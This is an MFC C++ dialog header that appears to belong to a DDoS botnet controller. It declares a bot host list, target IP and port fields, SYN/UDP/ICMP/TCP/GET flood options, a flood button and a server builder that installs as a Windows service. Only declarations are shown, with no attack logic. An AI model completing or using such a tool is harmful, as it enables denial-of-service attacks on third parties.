// ÅÌ¹ÅDlg.h : header file
//

#if !defined(AFX_DLG_H__F3967F80_03C7_457C_A0CA_FFEAC2ECCA97__INCLUDED_)
#define AFX_DLG_H__F3967F80_03C7_457C_A0CA_FFEAC2ECCA97__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

/////////////////////////////////////////////////////////////////////////////
// CMyDlg dialog
#include "ClientSock.h"
#include "AcceptSock.h"
#define IMENU_ITEM_ID 9002
class CMyDlg : public CDialog
{
// Construction
public:
	void CommandOK(int id);
	void DeleteHost(int id);
	void AddHost(int id, int ver, char *ip, char *mem, char *cpu);
	void AcceptPending(CAcceptSock *as);
	CMyDlg(CWnd* pParent = NULL);	// standard constructor

// Dialog Data
	//{{AFX_DATA(CMyDlg)
	enum { IDD = IDD_MY_DIALOG };
	CHoverEdit	m_e11;
	CHoverEdit	m_e10;
	CHoverEdit	m_e9;
	CHoverEdit	m_e8;
	CHoverEdit	m_e7;
	CHoverEdit	m_e6;
	CHoverEdit	m_e5;
	CHoverEdit	m_e4;
	CHoverEdit	m_e3;
	CHoverEdit	m_e2;
	CHoverEdit	m_e1;
	CWinXPButtonST	m_11;
	CWinXPButtonST	m_10;
	CWinXPButtonST	m_0;
	CWinXPButtonST	m_9;
	CWinXPButtonST	m_8;
	CWinXPButtonST	m_7;
	CWinXPButtonST	m_6;
	CWinXPButtonST	m_5;
	CWinXPButtonST	m_4;
	CWinXPButtonST	m_3;
	CWinXPButtonST	m_2;
	CListCtrl	m_ListCtrl;
	CString	m_domain;
	CString	m_tgtip;
	int		m_tgtport;
	int		m_upport;
	CString	m_svcdesc;
	CString	m_svcdisplay;
	CString	m_svcname;
	int		m_timeout;
	CString	m_extraurl;
	BOOL	m_syn;
	BOOL	m_udp;
	BOOL	m_icmp;
	BOOL	m_selall;
	BOOL	m_break;
	BOOL	m_2k;
	BOOL	m_sp2;
	CString	m_findip;
	CString	m_getobj;
	BOOL	m_get;
	BOOL	m_tcp;
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMyDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	CString data;
	CAcceptSock *AcceptSock;
	BOOL LoadSource(UINT resoure_id , const char * type , const char * filepath);
	HICON m_hIcon;

	// Generated message map functions
	//{{AFX_MSG(CMyDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	virtual void OnOK();
	afx_msg void OnButtonBeginlis();
	afx_msg void OnButtonMakeserver();
	afx_msg void OnButtonRemove();
	afx_msg void OnButtonFlood();
	afx_msg void OnButtonStop();
	afx_msg void OnButtonDownload();
	afx_msg void OnButtonHelp();
	afx_msg void OnButtonReflash();
	afx_msg void OnTimer(UINT nIDEvent);
	afx_msg void OnButtonUpdatedata();
	afx_msg void OnCheckAllsel();
	afx_msg void OnButtonTest();
	virtual void OnCancel();
	afx_msg void OnCheckW2000();
	afx_msg void OnCheckSp2();
	afx_msg void OnButtonFindip();
	afx_msg void OnCheckCover();
	afx_msg void OnCheckTcpbreak();
	afx_msg void OnCheckGet();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_DLG_H__F3967F80_03C7_457C_A0CA_FFEAC2ECCA97__INCLUDED_)
